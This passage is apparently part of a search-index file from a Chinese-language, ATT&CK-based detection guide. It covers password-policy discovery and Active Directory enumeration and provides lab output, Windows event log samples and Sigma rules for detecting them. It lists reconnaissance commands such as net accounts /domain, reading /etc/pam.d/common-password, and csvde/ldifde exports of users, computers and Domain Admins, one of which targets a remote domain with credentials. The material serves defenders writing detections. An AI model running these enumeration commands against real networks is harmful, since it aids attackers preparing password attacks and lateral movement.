\u5728\u57fa\u4e8e\u4e91\u7684\u7cfb\u7edf\u4e2d\uff0c\u672c\u673a\u65e5\u5fd7\u8bb0\u5f55\u53ef\u7528\u4e8e\u6807\u8bc6\u5bf9\u67d0\u4e9b\u53ef\u80fd\u5305\u542b\u7cfb\u7edf\u4fe1\u606f\u7684api\u548c\u4eea\u8868\u677f\u7684\u8bbf\u95ee\u3002\u6839\u636e\u73af\u5883\u7684\u4f7f\u7528\u65b9\u5f0f\uff0c\u7531\u4e8e\u6b63\u5e38\u64cd\u4f5c\u671f\u95f4\u7684\u826f\u6027\u4f7f\u7528\uff0c\u4ec5\u6b64\u6570\u636e\u53ef\u80fd\u4e0d\u591f\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1135 https://attack.mitre.org/techniques/T1135/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/","text":"T1201-win-\u5bc6\u7801\u7b56\u7565\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u7528\u4e8e\u7f51\u7edc\u7684\u5bc6\u7801\u7b56\u7565\u662f\u4e00\u79cd\u5f3a\u5236\u6267\u884c\u590d\u6742\u5bc6\u7801\u7684\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u5bc6\u7801\u5f88\u96be\u901a\u8fc7\u66b4\u529b\u731c\u6d4b\u6216\u7834\u89e3\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c1d\u8bd5\u8bbf\u95ee\u6709\u5173\u4f01\u4e1a\u7f51\u7edc\u4e2d\u4f7f\u7528\u7684\u5bc6\u7801\u7b56\u7565\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u8fd9\u5c06\u6709\u52a9\u4e8e\u653b\u51fb\u8005\u521b\u5efa\u4e00\u4e2a\u901a\u7528\u5bc6\u7801\u5217\u8868\uff0c\u5e76\u542f\u52a8\u7b26\u5408\u7b56\u7565\u7684\u5b57\u5178\u548c/\u6216\u66b4\u529b\u653b\u51fb\uff08\u4f8b\u5982\uff0c\u5982\u679c\u6700\u5c0f\u5bc6\u7801\u957f\u5ea6\u5e94\u4e3a8\uff0c\u5219\u4e0d\u5c1d\u8bd5\u201cpass123\u201d\u7b49\u5bc6\u7801\uff1b\u5982\u679c\u9501\u5b9a\u8bbe\u7f6e\u4e3a6\uff0c\u5219\u4e0d\u68c0\u67e5\u6bcf\u4e2a\u5e10\u6237\u8d85\u8fc73-4\u4e2a\u5bc6\u7801\uff0c\u4ee5\u514d\u9501\u5b9a\u5e10\u6237\uff09\u3002 \u5bc6\u7801\u7b56\u7565\u53ef\u4ee5\u5728Windows\u3001Linux\u548cmacOS\u7cfb\u7edf\u4e0a\u8bbe\u7f6e\u548c\u67e5\u627e\u3002 Windows net accounts net accounts /domain Linux chage -l cat /etc/pam.d/common-password macOS pwpolicy getaccountpolicies \u6d4b\u8bd5\u6848\u4f8b windows\u4e0b\u6267\u884cnet accounts\u4ee5\u53canet accounts /domain \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\administrator.0DAY>net accounts \u5f3a\u5236\u7528\u6237\u5728\u65f6\u95f4\u5230\u671f\u4e4b\u540e\u591a\u4e45\u5fc5\u987b\u6ce8\u9500?: \u4ece\u4e0d \u5bc6\u7801\u6700\u77ed\u4f7f\u7528\u671f\u9650(\u5929): 1 \u5bc6\u7801\u6700\u957f\u4f7f\u7528\u671f\u9650(\u5929): 42 \u5bc6\u7801\u957f\u5ea6\u6700\u5c0f\u503c: 7 \u4fdd\u6301\u7684\u5bc6\u7801\u5386\u53f2\u8bb0\u5f55\u957f\u5ea6: 24 \u9501\u5b9a\u9608\u503c: \u4ece\u4e0d \u9501\u5b9a\u6301\u7eed\u65f6\u95f4(\u5206): 30 \u9501\u5b9a\u89c2\u6d4b\u7a97\u53e3(\u5206): 30 \u8ba1\u7b97\u673a\u89d2\u8272: SERVER \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7\u3001\u8fdb\u7a0b\u3001\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows \u7cfb\u7edf\u5bc6\u7801\u7b56\u7565\u53d1\u73b0 description: windows server 2016 references: tags: T1016 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net accounts #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: C:\\Windows\\system32\\net1 accounts #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection1 and selection2 level: low \u5efa\u8bae \u9488\u5bf9\u57df\u5185\u5bc6\u7801\u7b56\u7565\u679a\u4e3e\u547d\u4ee4net accounts /domain\u7684\u68c0\u6d4b\u53ef\u4ece\u4ee5\u4e0b\u4e8b\u4ef6ID \uff08\u57df\u63a7\u4e3b\u673a\uff09 \u5165\u624b\u68c0\u6d4b\uff1a4672\u7279\u6b8a\u767b\u5f55\u30014624\u767b\u5f55\u30015140\u6587\u4ef6\u5171\u4eab\u30015145\u8be6\u7ec6\u6587\u4ef6\u5171\u4eab\u30014661SAM\u6587\u4ef6\u30014658\u5176\u4ed6\u5bf9\u8c61\u8bbf\u95ee\u4e8b\u4ef6\u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u9488\u5bf9\u57df\u5185\u4e3b\u673a\u6267\u884cnet accounts /domain\u547d\u4ee4\u8fdb\u884c\u68c0\u6d4b\uff0c\u5229\u7528\u57df\u63a7\u4e3b\u673a\u8bb0\u5f55\u7684\u767b\u9646IP\u8fdb\u884c\u5173\u8054\u3002 \u76d1\u89c6\u53ef\u80fd\u6b63\u5728\u7528\u4e8e\u5bc6\u7801\u7b56\u7565\u53d1\u73b0\u7684\u5de5\u5177\u548c\u547d\u4ee4\u884c\u53c2\u6570\u7684\u8fdb\u7a0b\u3002\u5c06\u8be5\u6d3b\u52a8\u4e0e\u6e90\u7cfb\u7edf\u4e2d\u7684\u5176\u4ed6\u53ef\u7591\u6d3b\u52a8\u5173\u8054\u8d77\u6765\uff0c\u4ee5\u51cf\u5c11\u6765\u81ea\u6709\u6548\u7528\u6237\u6216\u7ba1\u7406\u5458\u6d3b\u52a8\u7684\u6f5c\u5728\u8bef\u62a5\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u64cd\u4f5c\u7684\u65e9\u671f\u5c1d\u8bd5\u67e5\u627e\u5bc6\u7801\u7b56\u7565\uff0c\u5e76\u4e14\u8be5\u6d3b\u52a8\u53ef\u80fd\u4e0e\u5176\u4ed6\u53d1\u73b0\u6d3b\u52a8\u4e00\u8d77\u53d1\u751f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1201 https://attack.mitre.org/techniques/T1201/","title":"T1201-win-\u5bc6\u7801\u7b56\u7565\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#t1201-win-","text":"","title":"T1201-win-\u5bc6\u7801\u7b56\u7565\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#attck","text":"\u7528\u4e8e\u7f51\u7edc\u7684\u5bc6\u7801\u7b56\u7565\u662f\u4e00\u79cd\u5f3a\u5236\u6267\u884c\u590d\u6742\u5bc6\u7801\u7684\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u5bc6\u7801\u5f88\u96be\u901a\u8fc7\u66b4\u529b\u731c\u6d4b\u6216\u7834\u89e3\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c1d\u8bd5\u8bbf\u95ee\u6709\u5173\u4f01\u4e1a\u7f51\u7edc\u4e2d\u4f7f\u7528\u7684\u5bc6\u7801\u7b56\u7565\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u8fd9\u5c06\u6709\u52a9\u4e8e\u653b\u51fb\u8005\u521b\u5efa\u4e00\u4e2a\u901a\u7528\u5bc6\u7801\u5217\u8868\uff0c\u5e76\u542f\u52a8\u7b26\u5408\u7b56\u7565\u7684\u5b57\u5178\u548c/\u6216\u66b4\u529b\u653b\u51fb\uff08\u4f8b\u5982\uff0c\u5982\u679c\u6700\u5c0f\u5bc6\u7801\u957f\u5ea6\u5e94\u4e3a8\uff0c\u5219\u4e0d\u5c1d\u8bd5\u201cpass123\u201d\u7b49\u5bc6\u7801\uff1b\u5982\u679c\u9501\u5b9a\u8bbe\u7f6e\u4e3a6\uff0c\u5219\u4e0d\u68c0\u67e5\u6bcf\u4e2a\u5e10\u6237\u8d85\u8fc73-4\u4e2a\u5bc6\u7801\uff0c\u4ee5\u514d\u9501\u5b9a\u5e10\u6237\uff09\u3002 \u5bc6\u7801\u7b56\u7565\u53ef\u4ee5\u5728Windows\u3001Linux\u548cmacOS\u7cfb\u7edf\u4e0a\u8bbe\u7f6e\u548c\u67e5\u627e\u3002 Windows net accounts net accounts /domain Linux chage -l cat /etc/pam.d/common-password macOS pwpolicy getaccountpolicies","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_1","text":"windows\u4e0b\u6267\u884cnet accounts\u4ee5\u53canet accounts /domain","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_3","text":"Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\administrator.0DAY>net accounts \u5f3a\u5236\u7528\u6237\u5728\u65f6\u95f4\u5230\u671f\u4e4b\u540e\u591a\u4e45\u5fc5\u987b\u6ce8\u9500?: \u4ece\u4e0d \u5bc6\u7801\u6700\u77ed\u4f7f\u7528\u671f\u9650(\u5929): 1 \u5bc6\u7801\u6700\u957f\u4f7f\u7528\u671f\u9650(\u5929): 42 \u5bc6\u7801\u957f\u5ea6\u6700\u5c0f\u503c: 7 \u4fdd\u6301\u7684\u5bc6\u7801\u5386\u53f2\u8bb0\u5f55\u957f\u5ea6: 24 \u9501\u5b9a\u9608\u503c: \u4ece\u4e0d \u9501\u5b9a\u6301\u7eed\u65f6\u95f4(\u5206): 30 \u9501\u5b9a\u89c2\u6d4b\u7a97\u53e3(\u5206): 30 \u8ba1\u7b97\u673a\u89d2\u8272: SERVER \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_4","text":"windows\u5b89\u5168\u65e5\u5fd7\u3001\u8fdb\u7a0b\u3001\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#sigma","text":"title: windows \u7cfb\u7edf\u5bc6\u7801\u7b56\u7565\u53d1\u73b0 description: windows server 2016 references: tags: T1016 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net accounts #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: C:\\Windows\\system32\\net1 accounts #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection1 and selection2 level: low","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_6","text":"\u9488\u5bf9\u57df\u5185\u5bc6\u7801\u7b56\u7565\u679a\u4e3e\u547d\u4ee4net accounts /domain\u7684\u68c0\u6d4b\u53ef\u4ece\u4ee5\u4e0b\u4e8b\u4ef6ID \uff08\u57df\u63a7\u4e3b\u673a\uff09 \u5165\u624b\u68c0\u6d4b\uff1a4672\u7279\u6b8a\u767b\u5f55\u30014624\u767b\u5f55\u30015140\u6587\u4ef6\u5171\u4eab\u30015145\u8be6\u7ec6\u6587\u4ef6\u5171\u4eab\u30014661SAM\u6587\u4ef6\u30014658\u5176\u4ed6\u5bf9\u8c61\u8bbf\u95ee\u4e8b\u4ef6\u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u9488\u5bf9\u57df\u5185\u4e3b\u673a\u6267\u884cnet accounts /domain\u547d\u4ee4\u8fdb\u884c\u68c0\u6d4b\uff0c\u5229\u7528\u57df\u63a7\u4e3b\u673a\u8bb0\u5f55\u7684\u767b\u9646IP\u8fdb\u884c\u5173\u8054\u3002 \u76d1\u89c6\u53ef\u80fd\u6b63\u5728\u7528\u4e8e\u5bc6\u7801\u7b56\u7565\u53d1\u73b0\u7684\u5de5\u5177\u548c\u547d\u4ee4\u884c\u53c2\u6570\u7684\u8fdb\u7a0b\u3002\u5c06\u8be5\u6d3b\u52a8\u4e0e\u6e90\u7cfb\u7edf\u4e2d\u7684\u5176\u4ed6\u53ef\u7591\u6d3b\u52a8\u5173\u8054\u8d77\u6765\uff0c\u4ee5\u51cf\u5c11\u6765\u81ea\u6709\u6548\u7528\u6237\u6216\u7ba1\u7406\u5458\u6d3b\u52a8\u7684\u6f5c\u5728\u8bef\u62a5\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u64cd\u4f5c\u7684\u65e9\u671f\u5c1d\u8bd5\u67e5\u627e\u5bc6\u7801\u7b56\u7565\uff0c\u5e76\u4e14\u8be5\u6d3b\u52a8\u53ef\u80fd\u4e0e\u5176\u4ed6\u53d1\u73b0\u6d3b\u52a8\u4e00\u8d77\u53d1\u751f\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1201-win-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1201 https://attack.mitre.org/techniques/T1201/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/","text":"T1482-win-\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u83b7\u53d6\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u6536\u96c6\u6709\u5173\u57df\u4fe1\u4efb\u5173\u7cfb\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u7528\u4e8e\u8bc6\u522bWindows\u591a\u57df\u6216\u8005\u6797\u73af\u5883\u4e2d\u7684\u6a2a\u5411\u79fb\u52a8\u7684\u673a\u4f1a\u3002\u57df\u4fe1\u4efb\u4e3a\u57df\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u4ee5\u5141\u8bb8\u57fa\u4e8e\u53e6\u4e00\u4e2a\u57df\u7684\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u8bbf\u95ee\u8d44\u6e90\u3002\u57df\u4fe1\u4efb\u5141\u8bb8\u53d7\u4fe1\u4efb\u57df\u7684\u7528\u6237\u8bbf\u95ee\u4fe1\u4efb\u57df\u4e2d\u7684\u8d44\u6e90\u3002\u53d1\u73b0\u7684\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u8fdb\u884cSID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165\u3001\u7968\u636e\u4f20\u9012\u548cKerberoasting\u3002\u53ef\u4ee5\u4f7f\u7528DSEnumerateDomainTrusts()Win32 API\u8c03\u7528\uff0c.NET\u65b9\u6cd5\u548cLDAP\u679a\u4e3e\u57df\u4fe1\u4efb\u3002\u5df2\u77e5Windows\u5b9e\u7528\u7a0b\u5e8fNltest\u88ab\u653b\u51fb\u8005\u7528\u6765\u679a\u4e3e\u57df\u4fe1\u4efb\u4fe1\u606f\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5728\u672c\u6587\u4e2d\u5c06\u4ecb\u7ecd\u4ee5\u4e0b\u5185\u5bb9\uff1a \u4f7f\u7528csvde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u4f7f\u7528ldifde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u4f7f\u7528AdFind\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u4f7f\u7528nltest\u83b7\u53d6\u57df\u5185\u4fe1\u606f\u5173\u7cfb \u68c0\u6d4b\u65e5\u5fd7 Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 0x01 \u4f7f\u7528csvde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u8bf4\u660e\u6587\u6863\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732101(v=ws.11) \u4f7f\u7528csvde\u5bfc\u51fa\u7684\u6587\u4ef6\u683c\u5f0f\u4e3acsv\uff0c\u53ef\u4ee5\u4f7f\u7528Microsoft Excel\u67e5\u770b \u9ed8\u8ba4\u53ea\u80fd\u5728\u4ee5\u4e0b\u7cfb\u7edf\u4f7f\u7528\uff0c\u4f8b\u5982\uff1a Windows Server 2003 Windows Server 2008 Windows Server 2003 R2 Windows Server 2008 R2 Windows Server 2012, Windows Server 2003 with SP1 Windows 8 ~ \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a csvde -f all.csv \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a csvde -f user.csv -r \"(&(objectCategory=person))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a csvde -f machine.csv -r \"(&(objectCategory=computer))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a csvde -f group.csv -r \"(&(objectCategory=group))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a csvde -f admin.csv -r \"(&(objectCategory=group)(name=Domain Admins))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a csvde -f ou.csv -r \"(&(objectCategory=organizationalUnit))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a csvde -f username.csv -r \"(&(objectCategory=person))\" -l SamAccountName \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a csvde -f machinename.csv -r \"(&(objectCategory=computer))\" -l name \u6a21\u62df\u6d4b\u8bd5\u6548\u679c #\u57df\u63a7\u5236\u5668\u6a21\u62df\u6d4b\u8bd5\u6548\u679cwindows server 2016 C:\\Users\\12306br0>csvde -f all.csv \u8fde\u63a5\u5230\u201c(null)\u201d \u7528 SSPI \u4f5c\u4e3a\u5f53\u524d\u7528\u6237\u767b\u5f55 \u5c06\u76ee\u5f55\u5bfc\u51fa\u5230\u6587\u4ef6 all.csv \u641c\u7d22\u9879\u76ee... \u5199\u51fa\u9879\u76ee ............................................................................................................................................................................................................................... \u5bfc\u51fa\u5b8c\u6bd5\u3002\u540e\u7eed\u5904\u7406\u6b63\u5728\u8fdb\u884c... \u5bfc\u51fa\u4e86 223 \u4e2a\u9879\u76ee \u547d\u4ee4\u5df2\u6210\u529f\u5b8c\u6210 \u6d4b\u8bd5\u7559\u75d5\u6548\u679c #windows\u5b89\u5168\u65e5\u5fd74688\u8fdb\u7a0b\u521b\u5efa \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x36D7FD \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x12c0 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\csvde.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x1234 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: csvde -f all.csv \u5efa\u8bae \u5907\u6ce8\uff1a\u901a\u8fc7Windows\u5b89\u5168\u65e5\u5fd7\u53ef\u4ee5\u770b\u5230\uff0c\u5728\u8fdb\u7a0bcsvde\u521b\u5efa\u4e4b\u540e\uff1b\u4f1a\u8fdb\u884c\u7aef\u53e3\u7ed1\u5b9a\u6d3b\u52a8\u751f\u6210\u4e8b\u4ef65158\uff1b\u63a5\u7740\u8fdb\u884c\u7b5b\u9009\u8fde\u63a5\u884c\u4e3a\u751f\u6210\u4e8b\u4ef65156\uff0c\u7aef\u53e3389\uff1b\u6700\u540e\u5173\u95ed\u8fdb\u7a0b\u4e8b\u4ef64689. \u4ece\u57df\u5916\u8fdc\u7a0b\u5bfc\u51fa\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b \u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a csvde -s 192.168.1.1 -a test\\admin Password -f all.csv \u6682\u65e0\u6a21\u62df\u6d4b\u8bd5\u4ee5\u53ca\u6d4b\u8bd5\u7559\u75d5\u6570\u636e\u3002 0x02 \u4f7f\u7528ldifde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u8bf4\u660e\u6587\u6863\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11) \u4f7f\u7528ldifde\u5bfc\u51fa\u7684\u6587\u4ef6\u683c\u5f0f\u4e3aLDIF\uff0c\u53ef\u4ee5\u4f7f\u7528notepad.exe\u67e5\u770b \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a ldifde -f all.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=person))\" -f user.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=computer))\" -f machine.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=group))\" -f group.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=group)(name=Domain Admins))\" -f admin.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=organizationalUnit))\" -f ou.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a ldifde -r \"(&(objectCategory=person))\" -l SamAccountName -f username.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a ldifde -r \"(&(objectCategory=computer))\" -l name -f machinename.txt \u6a21\u62df\u6d4b\u8bd5\u6548\u679c C:\\Users\\12306br0\\Desktop\\AdFind>ldifde -f all.txt \u8fde\u63a5\u5230\u201c12306BR0B4DD.361a.com\u201d \u7528 SSPI \u4f5c\u4e3a\u5f53\u524d\u7528\u6237\u767b\u5f55 \u5c06\u76ee\u5f55\u5bfc\u51fa\u5230\u6587\u4ef6 all.txt \u641c\u7d22\u9879\u76ee... \u5199\u51fa\u9879\u76ee............................................................................................................................................................................................................................... \u5bfc\u51fa\u4e86 223 \u4e2a\u9879\u76ee \u547d\u4ee4\u5df2\u6210\u529f\u5b8c\u6210 C:\\Users\\12306br0\\Desktop\\AdFind> \u6d4b\u8bd5\u7559\u75d5\u6548\u679c \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x36D7FD \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xdd8 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\ldifde.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x69c \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: ldifde -f all.txt \u5efa\u8bae 